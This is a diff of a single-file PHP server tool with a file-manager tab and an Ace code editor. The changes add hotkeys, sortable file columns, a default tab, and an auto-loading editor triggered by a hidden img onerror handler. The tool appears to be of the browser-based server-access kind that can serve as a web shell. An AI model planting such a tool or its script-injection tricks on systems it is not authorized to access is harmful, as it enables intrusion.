 	var aceEditorDiv = document.createElement('div');
 	aceEditorDiv.id = eId;
 	aceEditorDiv.contentEditable = 'true';
-	aceEditorDiv.style = 'border: 1px solid #7f7f7f; height: 100%; margin: 2px; font-size: 12px;';
+	aceEditorDiv.style = 'border: 1px solid #7f7f7f; height: 100%; margin: 2px;';
 	aceEditorDiv.textContent = textArea.value;
+	aceEditorDiv.setAttribute('onkeydown', hotKeys);
 	parentForm.insertBefore(aceEditorDiv, parentForm.children[3]);
 	parentForm.setAttribute('onmousedown', 'if(event.srcElement.className != "ace_content") uiActvModal(event)');
-	saveButton.setAttribute('onclick', 'getParentFormOf(this).elements[0].value = aceEditor[\'' + eId + '\'].getValue()')
+	saveButton.setAttribute('onclick', 'getParentFormOf(this).elements[0].value = aceEditor[\'' + eId + '\'].getValue()');
 	closeButton.setAttribute('onclick', 'delete aceEditor[\'' + eId + '\'];' + closeButton.getAttribute('onclick'));
 
 	textArea.style.display = 'none';
@@ -7045,13 +7116,15 @@ function aceEditorProcess(element){
 	aceEditor[eId].setTheme('ace/theme/<?=$GLOBALS['ACECONF']['THEME']?>');
 	aceEditor[eId].session.setMode('ace/mode/<?=$GLOBALS['ACECONF']['MODE']?>');
 	aceEditor[eId].setOption('showPrintMargin', false);
+	aceEditor[eId].setOption('wrap', true);
 	aceEditor[eId].session.setUseWorker(false);
 	aceEditor[eId].setBehavioursEnabled(true);
 	
 	new ResizeObserver((function(){if(aceEditor[eId]) aceEditor[eId].resize()})).observe(parentForm);
 
-	aceEditorModeSelect = buildSelectFor(aceEditorModes, '<?=$GLOBALS['ACECONF']['MODE']?>', 'aceEditor[\'' + eId + '\'].session.setMode(\'ace/mode/\' + this.value);');
 	aceEditorThemeSelect = buildSelectFor(aceEditorThemes, '<?=$GLOBALS['ACECONF']['THEME']?>', 'aceEditor[\'' + eId + '\'].setTheme(\'ace/theme/\' + this.value);');
+	aceEditorModeSelect = buildSelectFor(aceEditorModes, '<?=$GLOBALS['ACECONF']['MODE']?>', 'aceEditor[\'' + eId + '\'].session.setMode(\'ace/mode/\' + this.value);');
+	aceEditorModeSelect.title = hotKeysHint;
 	
 	flexRow.insertBefore(aceEditorModeSelect, flexRow.children[1]);
     flexRow.insertBefore(aceEditorThemeSelect, flexRow.children[1]);
@@ -7070,9 +7143,38 @@ function buildSelectFor(array, selected = '', onChange = ''){
 	return select;
 }
 
-document.getElementById('tmplFrmFile').innerHTML = document.getElementById('tmplFrmFile').innerHTML.replace(/<\/a><\/div>/g,'</a> <a href="#"class="cntrl" onmouseover="if(typeof ace != \'undefined\') this.title = \'\'"  title="Code Editor&#x000a;&#x000a;After clicking, the EXTERNAL JS file will be loaded:&#x000a;&#x000a;<?=$GLOBALS['ACECONF']['URL']?>" onclick="aceEditorProcess(this);return false"><small>E</small></a></div>'); 
-</script>
+function insertCodeEditor(){
+	document.getElementById('tmplFrmFile').innerHTML = document.getElementById('tmplFrmFile').innerHTML.replace(/<\/a><\/div>/g,'</a> <a href="#" class="cntrl" onmouseover="if(typeof ace != \'undefined\') this.title = \'\'"  title="Code Editor&#x000a;&#x000a;After clicking, the EXTERNAL JS file will be loaded:&#x000a;&#x000a;<?=$GLOBALS['ACECONF']['URL']?>" onclick="aceEditorProcess(this);return false"><small>E</small></a><?=($GLOBALS['ACECONF']['DEFAULT'] ? '<img/src/onerror="aceEditorProcess(this)"/style="display:none;"/>' : '')?></div>');
+}
+
+insertCodeEditor();
 <?php } ?>
-<?=paramsHandlerJS()?>
+
+function addSortToFM(){
+	var fmTblCols = document.getElementById('tblFiles').children[0].children[0].children;
+	
+	for(i = 0; i <= fmTblCols.length; i++){
+		if(fmTblCols[i] && fmTblCols[i].textContent){
+			var name = fmTblCols[i].textContent.toLowerCase();
+			fmTblCols[i].style = fmTblCols[i].style + '; cursor: pointer;';
+			fmTblCols[i].title = 'Sort files by ' + name;
+			fmTblCols[i].setAttribute('onclick', 'sortFilesBy("' + name + '");');
+		}
+	}
+}
+
+function sortFilesBy(name){
+	var sorts = {'nam': '1','ext': '2','siz': '11','mod': '12','per': '14','own': '15'};
+	var sort = sorts[name.substr(0, 3)];
+	if(sort){
+		fmSort = [(sort == fmSort[1] && fmSort[0] != -1 ? -1 : 1), sort];
+		goTo(document.getElementById('frmFM').p.value);
+	}
+}
+
+addSortToFM();
+
+window.location = '#<?=$GLOBALS['DEFAULT_TAB']?>'; <?=($GLOBALS['DEFAULT_TAB'] == 'tabFM' ? 'goTo("~");' : '')?>
+</script>
 </html>
 <?php $out = ob_get_contents(); ob_end_clean(); ob_start('ob_gzhandler'); print makeOut($out); die;
